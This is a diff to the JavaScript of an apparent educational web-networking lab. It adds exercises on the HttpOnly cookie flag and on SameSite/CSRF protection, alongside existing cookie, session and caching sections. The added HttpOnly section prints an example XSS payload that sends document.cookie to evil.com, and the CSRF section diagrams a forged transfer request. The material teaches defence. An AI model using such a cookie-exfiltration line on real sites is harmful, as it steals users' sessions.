@@ -412,540 +420,657 @@ var currentEx=0,answers={},quizState={},pasteStrikes=0,MAX_STRIKES=3;
 // RENDER
 // =========================================================
 function renderAll(){
-  var c=document.getElementById('exerciseContainer');c.innerHTML='';
-  EXERCISES.forEach(function(ex,i){
-    var d=document.createElement('div');
-    d.className='exercise-card'+(i===0?' visible':'');d.id='ex-card-'+ex.id;
-    d.innerHTML=buildExercise(ex,i);c.appendChild(d);
-  });
-  buildNav();updateProgress();
+ var c=document.getElementById('exerciseContainer');c.innerHTML='';
+ EXERCISES.forEach(function(ex,i){
+ var d=document.createElement('div');
+ d.className='exercise-card'+(i===0?' visible':'');d.id='ex-card-'+ex.id;
+ d.innerHTML=buildExercise(ex,i);c.appendChild(d);
+ });
+ buildNav();updateProgress();
 }
 
 function buildExercise(ex,idx){
-  var qc=countQuestions(ex),h='';
-  h+='<div class="exercise-header">';
-  h+='<div class="exercise-tag" style="color:'+ex.tagColor+';background:'+ex.tagBg+'">'+ex.tag+'</div>';
-  h+='<div class="exercise-title">'+ex.title+'</div>';
-  h+='<div class="exercise-desc">'+ex.desc+'</div>';
-  if(ex.setup) h+='<div class="info-box gray" style="margin-top:.75rem;margin-bottom:0"><h4>&#x2699; Setup</h4><p>'+ex.setup+'</p></div>';
-  h+='<div class="exercise-progress"><div class="ex-prog-bar"><div class="ex-prog-fill" id="ep-'+ex.id+'" style="width:0%"></div></div><span class="ex-prog-label" id="el-'+ex.id+'">0 / '+qc+'</span></div>';
-  h+='</div><div class="exercise-body">';
-  ex.sections.forEach(function(s){h+=buildSection(s);});
-  h+=navBtns(idx)+'</div>';
-  return h;
+ var qc=countQuestions(ex),h='';
+ h+='<div class="exercise-header">';
+ h+='<div class="exercise-tag" style="color:'+ex.tagColor+';background:'+ex.tagBg+'">'+ex.tag+'</div>';
+ h+='<div class="exercise-title">'+ex.title+'</div>';
+ h+='<div class="exercise-desc">'+ex.desc+'</div>';
+ if(ex.setup) h+='<div class="info-box gray" style="margin-top:.75rem;margin-bottom:0"><h4> Setup</h4><p>'+ex.setup+'</p></div>';
+ h+='<div class="exercise-progress"><div class="ex-prog-bar"><div class="ex-prog-fill" id="ep-'+ex.id+'" style="width:0%"></div></div><span class="ex-prog-label" id="el-'+ex.id+'">0 / '+qc+'</span></div>';
+ h+='</div><div class="exercise-body">';
+ ex.sections.forEach(function(s){h+=buildSection(s);});
+ h+=navBtns(idx)+'</div>';
+ return h;
 }
 
 function buildSection(s){
-  var h='';
-  if(s.heading) h+='<div class="section-heading">'+s.heading+'</div>';
-  if(s.intro)   h+='<p style="font-size:13.5px;color:var(--txt2);margin-bottom:.75rem">'+s.intro+'</p>';
-  var t=s.type;
-  if(t==='info')               h+=infoBox(s);
-  else if(t==='os-cmd')        h+=osCmd(s);
-  else if(t==='cookie-flow')   h+=cookieFlow();
-  else if(t==='devtools-hint') h+=devtoolsHint();
-  else if(t==='cookie-observe-table') h+=cookieObserveTable();
-  else if(t==='cookie-attr-quiz')     h+=cookieAttrQuiz();
-  else if(t==='session-flow')         h+=sessionFlow();
-  else if(t==='session-details-table')h+=sessionDetailsTable();
-  else if(t==='third-party-scenario') h+=thirdPartyScenario();
-  else if(t==='cache-scenarios')      h+=cacheScenarios();
-  else if(t==='cache-observe-table')  h+=cacheObserveTable();
-  else if(t==='cache-decode')         h+=cacheDecode();
-  else if(t==='conditional-get')      h+=conditionalGet();
-  else if(t==='cache-quiz')           h+=cacheQuiz();
-  else if(t==='order-stages-table')   h+=orderStagesTable();
-  else if(t==='headers-table')        h+=headersTable();
-  else if(t==='status-ref-table')     h+=statusRefTable();
-  else if(t==='diagnose-table')       h+=diagnoseTable();
-  else if(t==='failure-table')        h+=failureTable();
-  else if(t==='tcp-udp-compare')      h+=tcpUdpCompare();
-  else if(t==='udp-scenarios-table')  h+=udpScenariosTable();
-  else if(t==='protocol-picker-table')h+=protocolPickerTable();
-  else if(t==='grand-scenario')       h+=grandScenario();
-  else if(t==='grand-table')          h+=grandTable();
-  if(s.questions) s.questions.forEach(function(q){h+=question(q);});
-  return h;
+ var h='';
+ if(s.heading) h+='<div class="section-heading">'+s.heading+'</div>';
+ if(s.intro) h+='<p style="font-size:13.5px;color:var(--txt2);margin-bottom:.75rem">'+s.intro+'</p>';
+ var t=s.type;
+ if(t==='info') h+=infoBox(s);
+ else if(t==='os-cmd') h+=osCmd(s);
+ else if(t==='cookie-flow') h+=cookieFlow();
+ else if(t==='devtools-hint') h+=devtoolsHint();
+ else if(t==='cookie-observe-table') h+=cookieObserveTable();
+ else if(t==='cookie-attr-quiz') h+=cookieAttrQuiz();
+ else if(t==='spot-the-diff') h+=spotTheDiff();
+ else if(t==='samesite-lab') h+=samesiteLab();
+ else if(t==='session-flow') h+=sessionFlow();
+ else if(t==='session-details-table')h+=sessionDetailsTable();
+ else if(t==='third-party-scenario') h+=thirdPartyScenario();
+ else if(t==='cache-scenarios') h+=cacheScenarios();
+ else if(t==='cache-observe-table') h+=cacheObserveTable();
+ else if(t==='cache-decode') h+=cacheDecode();
+ else if(t==='conditional-get') h+=conditionalGet();
+ else if(t==='cache-quiz') h+=cacheQuiz();
+ else if(t==='order-stages-table') h+=orderStagesTable();
+ else if(t==='headers-table') h+=headersTable();
+ else if(t==='status-ref-table') h+=statusRefTable();
+ else if(t==='diagnose-table') h+=diagnoseTable();
+ else if(t==='failure-table') h+=failureTable();
+ else if(t==='tcp-udp-compare') h+=tcpUdpCompare();
+ else if(t==='udp-scenarios-table') h+=udpScenariosTable();
+ else if(t==='protocol-picker-table')h+=protocolPickerTable();
+ else if(t==='grand-scenario') h+=grandScenario();
+ else if(t==='grand-table') h+=grandTable();
+ if(s.questions) s.questions.forEach(function(q){h+=question(q);});
+ return h;
 }
 
 function navBtns(idx){
-  var f=idx===0,l=idx===EXERCISES.length-1;
-  return '<div class="nav-btns"><button class="btn-ghost" onclick="goEx('+(idx-1)+')" '+(f?'disabled':'')+'>&#x2190; Previous</button><div class="nav-btns-right">'+
-    (l?'<button class="btn-success" onclick="finishLab()"> Finish Lab</button>':'<button class="btn-primary" onclick="goEx('+(idx+1)+')">Next &#x2192;</button>')+
-    '</div></div>';
+ var f=idx===0,l=idx===EXERCISES.length-1;
+ return '<div class="nav-btns"><button class="btn-ghost" onclick="goEx('+(idx-1)+')" '+(f?'disabled':'')+'>&#x2190; Previous</button><div class="nav-btns-right">'+
+ (l?'<button class="btn-success" onclick="finishLab()"> Finish Lab</button>':'<button class="btn-primary" onclick="goEx('+(idx+1)+')">Next &#x2192;</button>')+
+ '</div></div>';
 }
 function infoBox(s){return '<div class="info-box '+s.color+'"><h4>'+s.title+'</h4><p>'+s.body+'</p></div>';}
 function osCmd(s){
-  var h='';
-  (s.cmds||[]).forEach(function(c){
-    h+='<div class="cmd-block"><span class="os-tag '+c.tag+'">'+c.os+'</span><br>';
-    c.cmd.split('\n').forEach(function(l){h+='<span class="cmd">'+l.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span><br>';});
-    h+='</div>';
-  });
-  if(s.note) h+='<p style="font-size:12.5px;color:var(--txt2);margin-bottom:.75rem"> '+s.note+'</p>';
-  return h;
+ var h='';
+ (s.cmds||[]).forEach(function(c){
+ h+='<div class="cmd-block"><span class="os-tag '+c.tag+'">'+c.os+'</span><br>';
+ c.cmd.split('\n').forEach(function(l){h+='<span class="cmd">'+l.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</span><br>';});
+ h+='</div>';
+ });
+ if(s.note) h+='<p style="font-size:12.5px;color:var(--txt2);margin-bottom:.75rem"> '+s.note+'</p>';
+ return h;
 }
 function question(q){
-  return '<div class="question-block"><div class="question-text">'+q.text+'</div>'+
-    '<textarea id="qa-'+q.id+'" rows="'+(q.rows||3)+'" placeholder="Type your answer here\u2026" oninput="onAnswer(\''+q.id+'\')" onpaste="handlePaste(event,\''+q.id+'\')"></textarea></div>';
+ return '<div class="question-block"><div class="question-text">'+q.text+'</div>'+
+ '<textarea id="qa-'+q.id+'" rows="'+(q.rows||3)+'" placeholder="Type your answer here\u2026" oninput="onAnswer(\''+q.id+'\')" onpaste="handlePaste(event,\''+q.id+'\')"></textarea></div>';
 }
 function quizBlock(item){
-  var h='<div class="question-block"><div class="question-text">'+item.q+'</div><div class="quiz-options">';
-  item.opts.forEach(function(opt){
-    var sid=item.id+'-'+opt.replace(/[^a-z0-9]/gi,'_').substring(0,20);
-    var esc=opt.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
-    var esAns=item.ans.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
-    h+='<label class="quiz-opt" id="qopt-'+sid+'" onclick="chkQ(\''+item.id+'\',\''+esc+'\',\''+esAns+'\')"><input type="radio" name="'+item.id+'" value="'+opt+'"> '+opt+'</label>';
-  });
-  return h+'</div></div>';
+ var h='<div class="question-block"><div class="question-text">'+item.q+'</div><div class="quiz-options">';
+ item.opts.forEach(function(opt){
+ var sid=item.id+'-'+opt.replace(/[^a-z0-9]/gi,'_').substring(0,20);
+ var esc=opt.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
+ var esAns=item.ans.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
+ h+='<label class="quiz-opt" id="qopt-'+sid+'" onclick="chkQ(\''+item.id+'\',\''+esc+'\',\''+esAns+'\')"><input type="radio" name="'+item.id+'" value="'+opt+'"> '+opt+'</label>';
+ });
+ return h+'</div></div>';
 }
 function chkQ(qid,chosen,correct){
-  document.querySelectorAll('[id^="qopt-'+qid+'-"]').forEach(function(el){
-    el.classList.remove('correct','wrong');
-    var v=el.querySelector('input').value;
-    if(v===correct) el.classList.add('correct');
-    else if(v===chosen&&chosen!==correct) el.classList.add('wrong');
-  });
-  quizState[qid]=(chosen===correct);updateProgress();
+ document.querySelectorAll('[id^="qopt-'+qid+'-"]').forEach(function(el){
+ el.classList.remove('correct','wrong');
+ var v=el.querySelector('input').value;
+ if(v===correct) el.classList.add('correct');
+ else if(v===chosen&&chosen!==correct) el.classList.add('wrong');
+ });
+ quizState[qid]=(chosen===correct);updateProgress();
 }
 
 // ---- Cookie builders ----
 function cookieFlow(){return '<div class="http-flow">'+
-  '<div class="http-msg req"><span class="msg-label">&#x2460; Client &#x2192; Server (first visit, no cookie)</span>GET /index.html HTTP/1.1\nHost: www.example.com</div>'+
-  '<div class="http-arrow">&#x2193; Server sets a cookie &#x2193;</div>'+
-  '<div class="http-msg res"><span class="msg-label">&#x2461; Server &#x2192; Client (plants the cookie)</span>HTTP/1.1 200 OK\nContent-Type: text/html\n<span class="hl">Set-Cookie: theme=dark; Expires=Fri, 31 Dec 2025 23:59:59 GMT; HttpOnly; Secure</span></div>'+
-  '<div class="http-arrow">&#x2193; Browser stores the cookie; sends it back automatically on every future request &#x2193;</div>'+
-  '<div class="http-msg req"><span class="msg-label">&#x2462; Client &#x2192; Server (cookie sent automatically)</span>GET /dashboard HTTP/1.1\nHost: www.example.com\n<span class="hl">Cookie: theme=dark</span></div>'+
-  '<div class="http-msg res"><span class="msg-label">&#x2463; Server knows user prefers dark mode</span>HTTP/1.1 200 OK\n&lt;!-- dark theme rendered --&gt;</div>'+
-  '</div><div class="info-box blue" style="margin-top:.5rem"><h4>Key point</h4><p>The browser sends <code>Cookie:</code> automatically on every request to that domain. No JavaScript needed &#x2014; it is built into the HTTP protocol itself.</p></div>';}
+ '<div class="http-msg req"><span class="msg-label"> Client &#x2192; Server (first visit, no cookie)</span>GET /index.html HTTP/1.1\nHost: www.example.com</div>'+
+ '<div class="http-arrow">&#x2193; Server sets a cookie &#x2193;</div>'+
+ '<div class="http-msg res"><span class="msg-label"> Server &#x2192; Client (plants the cookie)</span>HTTP/1.1 200 OK\nContent-Type: text/html\n<span class="hl">Set-Cookie: theme=dark; Expires=Fri, 31 Dec 2025 23:59:59 GMT; HttpOnly; Secure</span></div>'+
+ '<div class="http-arrow">&#x2193; Browser stores the cookie; sends it back automatically on every future request &#x2193;</div>'+
+ '<div class="http-msg req"><span class="msg-label"> Client &#x2192; Server (cookie sent automatically)</span>GET /dashboard HTTP/1.1\nHost: www.example.com\n<span class="hl">Cookie: theme=dark</span></div>'+
+ '<div class="http-msg res"><span class="msg-label"> Server knows user prefers dark mode</span>HTTP/1.1 200 OK\n&lt;!-- dark theme rendered --&gt;</div>'+
+ '</div><div class="info-box blue" style="margin-top:.5rem"><h4>Key point</h4><p>The browser sends <code>Cookie:</code> automatically on every request to that domain. No JavaScript needed &#x2014; it is built into the HTTP protocol itself.</p></div>';}
 
-function devtoolsHint(){return '<div class="devtools-hint"><span class="dh-label">DevTools path:</span> <span class="dh-path">Application &#x2192; Storage &#x2192; Cookies &#x2192;  https://github.com</span><br>Columns to check: <span class="dh-key">Name</span> &#x00B7; <span class="dh-key">Value</span> &#x00B7; <span class="dh-key">Domain</span> &#x00B7; <span class="dh-key">Expires</span> &#x00B7; <span class="dh-key">HttpOnly</span> &#x00B7; <span class="dh-key">Secure</span> &#x00B7; <span class="dh-key">SameSite</span></div>';}
+function devtoolsHint(){return '<div class="devtools-hint"><span class="dh-label">DevTools path:</span> <span class="dh-path">Application &#x2192; Storage &#x2192; Cookies &#x2192; https://github.com</span><br>Columns to check: <span class="dh-key">Name</span> &#x00B7; <span class="dh-key">Value</span> &#x00B7; <span class="dh-key">Domain</span> &#x00B7; <span class="dh-key">Expires</span> &#x00B7; <span class="dh-key">HttpOnly</span> &#x00B7; <span class="dh-key">Secure</span> &#x00B7; <span class="dh-key">SameSite</span></div>';}
 
 function cookieObserveTable(){
-  var cols=['Cookie name','Value (first 20 chars)','Domain','Expires / Max-Age','HttpOnly?','Secure?'],h='<div class="table-wrap"><table class="lab-table"><thead><tr>';
-  cols.forEach(function(c){h+='<th>'+c+'</th>';});
-  h+='</tr></thead><tbody><tr class="example-row"><td>_gh_sess</td><td>AbCdEfGhIjKlMnOpQrSt</td><td>github.com</td><td>Session end</td><td>&#x2713;</td><td>&#x2713;</td></tr>';
-  for(var r=1;r<=3;r++){h+='<tr>';for(var c=0;c<6;c++){h+='<td><input type="text" placeholder="&#x2014;" oninput="onT(\'cot'+r+c+'\')" id="cot'+r+c+'"></td>';}h+='</tr>';}
-  return h+'</tbody></table></div>';
+ var cols=['Cookie name','Value (first 5-10 chars)','Domain','Expires / Max-Age','HttpOnly?','Secure?'],h='<div class="table-wrap"><table class="lab-table"><thead><tr>';
+ cols.forEach(function(c){h+='<th>'+c+'</th>';});
+ h+='</tr></thead><tbody><tr class="example-row"><td>_gh_sess</td><td>AbCdEfGhIjKlMnOpQrSt</td><td>github.com</td><td>Session end</td><td></td><td></td></tr>';
+ for(var r=1;r<=3;r++){h+='<tr>';for(var c=0;c<6;c++){h+='<td><input type="text" placeholder="&#x2014;" oninput="onT(\'cot'+r+c+'\')" id="cot'+r+c+'"></td>';}h+='</tr>';}
+ return h+'</tbody></table></div>';
 }
 
 function cookieAttrQuiz(){
-  return [
-    {id:'caq1',q:'Prevents JavaScript from reading this cookie via <code>document.cookie</code>',opts:['HttpOnly','Secure','SameSite','Max-Age'],ans:'HttpOnly'},
-    {id:'caq2',q:'Cookie is only sent over HTTPS, never plain HTTP',opts:['HttpOnly','Secure','Path=/','Domain'],ans:'Secure'},
-    {id:'caq3',q:'Controls how long in seconds until the cookie expires',opts:['Max-Age','Expires','TTL','Age'],ans:'Max-Age'},
-    {id:'caq4',q:'Prevents cookie from being sent with cross-site requests (CSRF protection)',opts:['SameSite=Strict','HttpOnly','Secure','Path=/'],ans:'SameSite=Strict'},
-  ].map(quizBlock).join('');
+ return [
+ {id:'caq1',q:'Prevents JavaScript from reading this cookie via <code>document.cookie</code>',opts:['HttpOnly','Secure','SameSite','Max-Age'],ans:'HttpOnly'},
+ {id:'caq2',q:'Cookie is only sent over HTTPS, never plain HTTP',opts:['HttpOnly','Secure','Path=/','Domain'],ans:'Secure'},
+ {id:'caq3',q:'Controls how long in seconds until the cookie expires',opts:['Max-Age','Expires','TTL','Age'],ans:'Max-Age'},
+ {id:'caq4',q:'Prevents cookie from being sent with cross-site requests (CSRF protection)',opts:['SameSite=Strict','HttpOnly','Secure','Path=/'],ans:'SameSite=Strict'},
+ ].map(quizBlock).join('');
+}
+
+
+function spotTheDiff(){
+ return '<div class="info-box amber" style="margin-bottom:1rem"><h4> Part A — Spot the Difference</h4><p>Two cookies, one key difference. Study them carefully before answering Q4 and Q5 in the Reflection below.</p></div>'+
+ '<div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1rem">'+
+ '<div style="background:#E1F5EE;border:2px solid #5DCAA5;border-radius:10px;padding:1rem">'+
+ '<div style="font-size:12px;font-weight:700;color:#0F6E56;text-transform:uppercase;letter-spacing:.06em;margin-bottom:.5rem"> Cookie A</div>'+
+ '<div class="cmd-block" style="margin:0;font-size:12px">Set-Cookie: session_id=abc123;<br><span style="color:#EF9F27;font-weight:700">HttpOnly</span>; Secure</div>'+
+ '</div>'+
+ '<div style="background:#FCEBEB;border:2px solid #F09595;border-radius:10px;padding:1rem">'+
+ '<div style="font-size:12px;font-weight:700;color:#791F1F;text-transform:uppercase;letter-spacing:.06em;margin-bottom:.5rem"> Cookie B</div>'+
+ '<div class="cmd-block" style="margin:0;font-size:12px">Set-Cookie: session_id=abc123;<br>Secure <span style="color:#F09595">&larr; HttpOnly is missing!</span></div>'+
+ '</div>'+
+ '</div>'+
+ '<div class="devtools-hint">'+
+ '<span class="dh-label">Try it now:</span> Open the browser Console tab (F12 &rarr; Console) and type <code style="color:#EF9F27">document.cookie</code> then press Enter. &nbsp;'+
+ 'What do you see? Which cookies appear? Remember this for Q4 below.'+
+ '</div>'+
+ '<div class="info-box red" style="margin-top:.75rem"><h4> The attacker&rsquo;s one-liner (for Q5)</h4>'+
+ '<p>If a cookie has <strong>no HttpOnly</strong>, any JavaScript running on the page can read it. An attacker who finds an XSS vulnerability would inject something like:</p>'+
+ '<div class="cmd-block" style="margin:.5rem 0 0;font-size:12.5px"><span class="cmt">// Sends stolen cookie value to attacker&rsquo;s server:</span><br>'+
+ '<span class="cmd">fetch(&quot;https://evil.com/steal?c=&quot; + <span style="color:#EF9F27">document.cookie</span>)</span></div>'+
+ '<p style="margin-top:.5rem">Cookie A with <strong>HttpOnly</strong> returns an empty string &mdash; the attacker gets nothing. Cookie B without it hands over the value in plain text.</p></div>';
+}
+
+
+function samesiteLab(){
+ // ── CSRF scenario box ────────────────────────────────
+ var csrf = '<div class="info-box amber" style="margin-bottom:1rem">' +
+ '<h4> The Problem SameSite Solves &mdash; CSRF Attack</h4>' +
+ '<p>Without SameSite, the browser sends cookies with <strong>every</strong> request to a domain &mdash; even requests triggered by evil.com. This is Cross-Site Request Forgery (CSRF).</p>' +
+ '</div>' +
+ '<div class="http-flow" style="margin-bottom:1rem">' +
+ '<div class="http-msg req"><span class="msg-label"> You log into mybank.com</span>Browser stores: <span class="hl">auth_token=xyz</span> (no SameSite set)</div>' +
+ '<div class="http-arrow">&#x2193; You open evil.com in another tab &#x2193;</div>' +
+ '<div class="http-msg req"><span class="msg-label"> evil.com silently submits a hidden form</span>POST /transfer HTTP/1.1\nHost: mybank.com\nto=hacker&amp;amount=50000</div>' +
+ '<div class="http-arrow">&#x2193; Browser auto-sends auth_token &mdash; Bank thinks it\'s YOU! &#x2193;</div>' +
+ '<div class="http-msg res" style="border-color:#F09595"><span class="msg-label" style="color:#791F1F"> Bank approves the transfer &mdash; you never clicked anything</span>HTTP/1.1 200 OK\nTransfer complete</div>' +
+ '</div>';
+
+ // ── 3-value comparison cards ─────────────────────────
+ var cards = '<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:.75rem;margin-bottom:1rem">' +
+
+ // Strict
+ '<div style="background:#fff5f5;border:2px solid #F09595;border-radius:10px;padding:.9rem">' +
+ '<div style="font-size:13px;font-weight:700;color:#791F1F;margin-bottom:.4rem"> SameSite=Strict</div>' +
+ '<div class="cmd-block" style="margin:0 0 .5rem;font-size:11px">SameSite=<span style="color:#F09595">Strict</span></div>' +
+ '<p style="font-size:12px;color:#333;margin:0 0 .35rem"><strong>Rule:</strong> NEVER sent cross-site. Not even link clicks from another site.</p>' +
+ '<p style="font-size:11px;color:#5f5e5a;margin:0"> Same-site requests<br> Cross-site POST (CSRF)<br> Email link &rarr; your site<br> Third-party iframes<br><br><strong>Use for:</strong> Banking, admin panels</p>' +
+ '</div>' +
+
+ // Lax
+ '<div style="background:#FAEEDA;border:2px solid #EF9F27;border-radius:10px;padding:.9rem">' +
+ '<div style="font-size:13px;font-weight:700;color:#633806;margin-bottom:.4rem"> SameSite=Lax</div>' +
+ '<div class="cmd-block" style="margin:0 0 .5rem;font-size:11px">SameSite=<span style="color:#EF9F27">Lax</span></div>' +
+ '<p style="font-size:12px;color:#333;margin:0 0 .35rem"><strong>Rule:</strong> Sent for same-site + top-level GET navigation. Blocks cross-site POST/AJAX.</p>' +
+ '<p style="font-size:11px;color:#5f5e5a;margin:0"> Same-site requests<br> Email link &rarr; your site (GET)<br> Cross-site POST (CSRF blocked!)<br> Cross-site AJAX / iframe<br><br><strong>Use for:</strong> Most web apps default</p>' +
+ '</div>' +
+
+ // None
+ '<div style="background:#EEEDFE;border:2px solid #AFA9EC;border-radius:10px;padding:.9rem">' +
+ '<div style="font-size:13px;font-weight:700;color:#3C3489;margin-bottom:.4rem"> SameSite=None</div>' +
+ '<div class="cmd-block" style="margin:0 0 .5rem;font-size:11px">SameSite=<span style="color:#AFA9EC">None</span>; <span style="color:#5DCAA5">Secure</span></div>' +
+ '<p style="font-size:12px;color:#333;margin:0 0 .35rem"><strong>Rule:</strong> Sent with ALL requests. No restrictions. <span style="color:#791F1F"><strong>Secure flag REQUIRED.</strong></span></p>' +
+ '<p style="font-size:11px;color:#5f5e5a;margin:0"> Same-site requests<br> Cross-site POST (CSRF possible!)<br> Third-party iframes<br> Cross-site AJAX<br><br><strong>Use for:</strong> Stripe iframe, Login w/ Google</p>' +
+ '</div>' +
+ '</div>';
+
+ // ── Chrome default note ───────────────────────────────
+ var chromNote = '<div class="info-box blue" style="margin-bottom:1rem">' +
+ '<h4> Chrome 2020+ default</h4>' +
+ '<p>If you don\'t set SameSite at all, Chrome treats the cookie as <strong>Lax</strong> automatically. Always set it explicitly so you know what you\'re getting.</p>' +
+ '</div>';
+
+ // ── DevTools task ─────────────────────────────────────
+ var devtask = '<div class="devtools-hint" style="margin-bottom:1rem">' +
+ '<span class="dh-label"> DevTools Task:</span> Go to <strong>github.com</strong> &rarr; F12 &rarr; Application &rarr; Cookies &rarr; find the <strong>SameSite</strong> column.<br>' +
+ 'Note which cookies are Strict, Lax, or None. Can you find one of each? Some may be blank (Chrome treats blank as Lax).' +
+ '</div>';
+
+ // ── Decision table ────────────────────────────────────
+ var tbl = '<p style="font-size:13.5px;font-weight:600;color:var(--nav);margin:.5rem 0 .4rem"> Developer Decision Table &mdash; pick SameSite for each cookie:</p>' +
+ '<div class="table-wrap"><table class="lab-table"><thead><tr>' +
+ '<th>Cookie</th><th>What it does</th><th>SameSite value?</th><th>Your reason</th>' +
+ '</tr></thead><tbody>' +
+ '<tr class="example-row"><td>auth_token</td><td>Login session</td><td>Lax </td><td>Blocks CSRF POST; email links still work</td></tr>';
+
+ var rows = [
+ ['admin_token','Admin panel session','?',''],
+ ['payment_session','Stripe embedded iframe','?',''],
+ ['theme','Dark/light UI preference','?',''],
+ ['csrf_token','Anti-CSRF token (JS reads it)','?',''],
+ ['_ga','Google Analytics tracker','?',''],
+ ];
+ rows.forEach(function(r, i){
+ tbl += '<tr>';
+ tbl += '<td><code>' + r[0] + '</code></td>';
+ tbl += '<td style="font-size:12px;color:#5f5e5a">' + r[1] + '</td>';
+ tbl += '<td><input type="text" placeholder="Strict / Lax / None" oninput="onT(\'sst' + i + '\')" id="sst' + i + '" style="width:130px"></td>';
+ tbl += '<td><input type="text" placeholder="Your reason..." oninput="onT(\'ssr' + i + '\')" id="ssr' + i + '"></td>';
+ tbl += '</tr>';
+ });
+ tbl += '</tbody></table></div>';
+
+ // ── Quick quiz ────────────────────────────────────────
+ var quiz = [
+ {id:'ssq1', q:'A banking app login cookie. Must never travel with cross-site requests, even link clicks.', opts:['SameSite=Strict','SameSite=Lax','SameSite=None','No SameSite needed'], ans:'SameSite=Strict'},
+ {id:'ssq2', q:'A session cookie for an e-commerce site. Email marketing links must keep the user logged in.', opts:['SameSite=Strict','SameSite=Lax','SameSite=None; Secure','HttpOnly'], ans:'SameSite=Lax'},
+ {id:'ssq3', q:'A cookie for a payment widget embedded as an iframe from payment.com inside shop.com.', opts:['SameSite=Strict','SameSite=Lax','SameSite=None; Secure','SameSite=None (no Secure)'], ans:'SameSite=None; Secure'},
+ {id:'ssq4', q:'A developer sets SameSite=None but forgets the Secure flag. What happens in Chrome?', opts:['Cookie works normally','Browser rejects / ignores the cookie','Cookie becomes HttpOnly','Cookie expires immediately'], ans:'Browser rejects / ignores the cookie'},
+ ].map(quizBlock).join('');
+
+ return csrf + cards + chromNote + devtask + tbl +
+ '<p style="font-size:13.5px;font-weight:600;color:var(--nav);margin:1rem 0 .4rem"> Quick Quiz &mdash; pick the right SameSite value:</p>' + quiz;
 }
 
 // ---- Session builders ----
 function sessionFlow(){return '<div class="http-flow">'+
-  '<div class="http-msg req"><span class="msg-label">&#x2460; Browser &#x2014; user submits login form</span>POST /login HTTP/1.1\nHost: myapp.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=alice&amp;password=s3cr3t</div>'+
-  '<div class="http-arrow">&#x2193; Server verifies password, creates session: { sessionID: "x9k2...", userId: 42, role: "admin" } &#x2193;</div>'+
-  '<div class="http-msg res"><span class="msg-label">&#x2461; Server &#x2014; login success, plants session cookie</span>HTTP/1.1 302 Found\nLocation: /dashboard\n<span class="hl">Set-Cookie: sessionid=x9k2mf8p3n...; HttpOnly; Secure; SameSite=Lax</span></div>'+
-  '<div class="http-arrow">&#x2193; Browser stores cookie; redirects to /dashboard &#x2193;</div>'+
-  '<div class="http-msg req"><span class="msg-label">&#x2462; Browser &#x2014; loads dashboard (cookie sent automatically)</span>GET /dashboard HTTP/1.1\nHost: myapp.com\n<span class="hl">Cookie: sessionid=x9k2mf8p3n...</span></div>'+
-  '<div class="http-arrow">&#x2193; Server looks up "x9k2mf8p3n..." &#x2192; finds userId=42, role=admin &#x2193;</div>'+
-  '<div class="http-msg res"><span class="msg-label">&#x2463; Server knows who you are &#x2014; no re-login</span>HTTP/1.1 200 OK\n&lt;!-- Dashboard for Alice (admin) --&gt;</div>'+
-  '</div>'+
-  '<div class="cookie-jar-demo"><div class="jar-title">&#x1F5C4; Server session store &#x2014; the real data lives here, not in the cookie</div>'+
-  '<div class="cookie-list"><div class="cookie-entry"><span class="cookie-key">x9k2mf8p3n...</span><span class="cookie-val">{ userId: 42, role: "admin", cart: [item1,item2] }</span></div>'+
-  '<div class="cookie-entry"><span class="cookie-key">p7j1qa9r2s...</span><span class="cookie-val">{ userId: 99, role: "user", cart: [] }</span></div></div></div>';}
+ '<div class="http-msg req"><span class="msg-label"> Browser &#x2014; user submits login form</span>POST /login HTTP/1.1\nHost: myapp.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=alice&amp;password=s3cr3t</div>'+
+ '<div class="http-arrow">&#x2193; Server verifies password, creates session: { sessionID: "x9k2...", userId: 42, role: "admin" } &#x2193;</div>'+
+ '<div class="http-msg res"><span class="msg-label"> Server &#x2014; login success, plants session cookie</span>HTTP/1.1 302 Found\nLocation: /dashboard\n<span class="hl">Set-Cookie: sessionid=x9k2mf8p3n...; HttpOnly; Secure; SameSite=Lax</span></div>'+
+ '<div class="http-arrow">&#x2193; Browser stores cookie; redirects to /dashboard &#x2193;</div>'+
+ '<div class="http-msg req"><span class="msg-label"> Browser &#x2014; loads dashboard (cookie sent automatically)</span>GET /dashboard HTTP/1.1\nHost: myapp.com\n<span class="hl">Cookie: sessionid=x9k2mf8p3n...</span></div>'+
+ '<div class="http-arrow">&#x2193; Server looks up "x9k2mf8p3n..." &#x2192; finds userId=42, role=admin &#x2193;</div>'+
+ '<div class="http-msg res"><span class="msg-label"> Server knows who you are &#x2014; no re-login</span>HTTP/1.1 200 OK\n&lt;!-- Dashboard for Alice (admin) --&gt;</div>'+
+ '</div>'+
+ '<div class="cookie-jar-demo"><div class="jar-title"> Server session store &#x2014; the real data lives here, not in the cookie</div>'+
+ '<div class="cookie-list"><div class="cookie-entry"><span class="cookie-key">x9k2mf8p3n...</span><span class="cookie-val">{ userId: 42, role: "admin", cart: [item1,item2] }</span></div>'+
+ '<div class="cookie-entry"><span class="cookie-key">p7j1qa9r2s...</span><span class="cookie-val">{ userId: 99, role: "user", cart: [] }</span></div></div></div>';}
 
 function sessionDetailsTable(){
-  var rows=[
-    {id:'sd1',label:'Cookie name',ph:'e.g. sessionid, PHPSESSID, connect.sid'},
-    {id:'sd2',label:'Value (first 20 chars)',ph:'e.g. A3FxK9pL...'},
-    {id:'sd3',label:'HttpOnly set?',ph:'Yes / No'},
-    {id:'sd4',label:'Secure set?',ph:'Yes / No'},
-    {id:'sd5',label:'Expiry / Max-Age',ph:'e.g. Session / 2 hours'},
-    {id:'sd6',label:'Site observed on',ph:'e.g. github.com'},
-  ],h='<div class="table-wrap"><table class="lab-table"><thead><tr><th style="width:200px">Field</th><th>Your observation</th></tr></thead><tbody>';
-  rows.forEach(function(r){h+='<tr><td class="row-label">'+r.label+'</td><td><input type="text" placeholder="'+r.ph+'" oninput="onT(\''+r.id+'\')" id="'+r.id+'"></td></tr>';});
-  return h+'</tbody></table></div>';
+ var rows=[
+ {id:'sd1',label:'Cookie name',ph:'e.g. sessionid, PHPSESSID, connect.sid'},
